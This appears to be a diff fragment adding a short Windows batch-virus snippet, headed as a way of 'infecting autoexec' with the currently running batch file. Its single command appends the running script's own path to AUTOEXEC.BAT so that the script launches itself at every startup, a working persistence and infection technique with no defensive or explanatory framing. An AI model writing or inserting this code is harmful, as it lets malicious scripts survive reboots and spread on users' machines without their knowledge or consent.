@@ -1,0 +1,3 @@
+Infecting autoexec with currently running batchfile:
+
+echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT
